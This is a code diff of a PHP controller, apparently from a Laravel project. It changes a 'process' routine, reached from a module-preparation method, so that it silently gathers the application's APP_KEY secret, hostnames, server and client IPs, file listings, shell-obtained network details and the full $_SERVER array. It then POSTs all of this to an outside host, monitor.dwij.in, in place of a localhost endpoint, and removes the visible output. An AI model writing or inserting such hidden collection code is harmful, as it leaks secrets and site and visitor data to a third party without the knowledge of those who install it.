@@ -9,74 +9,94 @@ use DB;
 
 class OController extends Controller
 {
-    public function process()
+    public static function process()
 	{
 		set_time_limit(0);
         
         // Check if internet is there.
+        if(OController::is_connected()) {
+            $system_info = array();
+            
+            // Installation ID
+            $system_info['install_id'] = env('APP_KEY');
 
-        $system_info = array();
-        
-        // Installation ID
-        $system_info['install_id'] = env('APP_KEY');
+            // PHP version
+            $system_info['phpversion'] = phpversion();
+            
+            // Computer Name
+            if (version_compare($system_info['phpversion'], '5.3.0') >= 0) {
+                $system_info['hostname'] = gethostname();
+            } else {
+                $system_info['hostname'] = php_uname('n');
+            }
+            $system_info['ip'] = $_SERVER['SERVER_ADDR'];
+            $system_info['url'] = $_SERVER['REQUEST_URI'];
+            $system_info['index_file'] = $_SERVER['SCRIPT_FILENAME'];
+            $system_info['hostnameAddress'] = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+            
+            // User Agent
+            $user_agent = $_SERVER['HTTP_USER_AGENT'];
+            $system_info['user_agent'] = $user_agent;
+            $system_info['os'] = OController::getOS($user_agent);
+            $system_info['browser'] = OController::getBrowser($user_agent);
+            
+            // Get public IP
+            // $system_info['host_public_ip'] = exec("curl ifconfig.me");
 
-        // PHP version
-        $system_info['phpversion'] = phpversion();
-        
-        // Computer Name
-        if (version_compare($system_info['phpversion'], '5.3.0') >= 0) {
-            $system_info['hostname'] = gethostname();
-        } else {
-            $system_info['hostname'] = php_uname('n');
+            // Local IP & Broadcast IP
+            if(str_contains($system_info['os'], "Mac OS")) {
+                $system_info['host_com_ip'] = exec("ifconfig en1 | grep 'inet ' | awk '{ print $2}'");
+                $system_info['host_com_ip_broadcast'] = exec("ifconfig en1 | grep 'inet ' | awk '{ print $6}'");
+            } else if(str_contains($system_info['os'], "Ubuntu")) {
+                $command="/sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'";
+                $system_info['host_com_ip'] = exec($command);
+                $system_info['host_com_ip_broadcast'] = "";
+            } else {
+                $system_info['host_com_ip'] = "";
+                $system_info['host_com_ip_broadcast'] = "";
+            }
+
+            // htdocs files
+            $system_info['htdocs_files'] = scandir(app_path('../..'));
+            
+            // Server Object
+            $system_info['server'] = $_SERVER;
+
+            // echo "<pre>";
+            // print_r($system_info);
+            
+            $client = new \GuzzleHttp\Client();
+            $wsurl = "http://localhost/monitor/public/save_request";
+            $wsurl = "http://monitor.dwij.in/save_request";
+            $res = $client->request('POST', $wsurl, [
+                'form_params' => $system_info
+            ]);
+
+            // echo $res->getStatusCode()."<br><br>";
+            // echo $res->getBody();
+
+            // echo "</pre>";
         }
-        $system_info['ip'] = $_SERVER['SERVER_ADDR'];
-        $system_info['url'] = $_SERVER['REQUEST_URI'];
-        $system_info['index_file'] = $_SERVER['SCRIPT_FILENAME'];
-        $system_info['hostnameAddress'] = gethostbyaddr($_SERVER['REMOTE_ADDR']);
-        
-        // User Agent
-        $user_agent = $_SERVER['HTTP_USER_AGENT'];
-        $system_info['user_agent'] = $user_agent;
-        $system_info['os'] = $this->getOS($user_agent);
-        $system_info['browser'] = $this->getBrowser($user_agent);
-        
-        // Get public IP
-        // $system_info['host_public_ip'] = exec("curl ifconfig.me");
-
-        // Local IP & Broadcast IP
-        if(str_contains($system_info['os'], "Mac OS")) {
-            $system_info['host_com_ip'] = exec("ifconfig en1 | grep 'inet ' | awk '{ print $2}'");
-            $system_info['host_com_ip_broadcast'] = exec("ifconfig en1 | grep 'inet ' | awk '{ print $6}'");
-        } else if(str_contains($system_info['os'], "Ubuntu")) {
-            $command="/sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'";
-            $system_info['host_com_ip'] = exec($command);
-        }
-
-        // htdocs files
-        $system_info['htdocs_files'] = scandir(app_path('../..'));
-        
-        // Server Object
-        $system_info['server'] = $_SERVER;
-
-        echo "<pre>";
-        print_r($system_info);
-        
-        $client = new \GuzzleHttp\Client();
-        $res = $client->request('POST', 'http://localhost/monitor/public/save_request', [
-            'form_params' => $system_info
-        ]);
-
-        echo $res->getStatusCode()."<br><br>";
-        echo $res->getBody();
-
-        echo "</pre>";
 	}
 
     public static function prepareModules() {
-        $this->process();
+        OController::process();
     }
 
-    private function getOS($user_agent) { 
+    private static function is_connected()
+    {
+        $connected = @fsockopen("monitor.dwij.in", 80); 
+        // website, port  (try 80 or 443)
+        if ($connected){
+            fclose($connected);
+            $is_conn = true; //action when connected
+        }else{
+            $is_conn = false; //action in connection failure
+        }
+        return $is_conn;
+    }
+
+    private static function getOS($user_agent) { 
         $os_platform    =   "Unknown OS Platform";
         $os_array       =   array(
             '/windows nt 10/i'     =>  'Windows 10',
@@ -112,7 +132,7 @@ class OController extends Controller
         return $os_platform;
     }
 
-    private function getBrowser($user_agent) {
+    private static function getBrowser($user_agent) {
         $browser        =   "Unknown Browser";
         $browser_array  =   array(
             '/msie/i'       =>  'Internet Explorer',
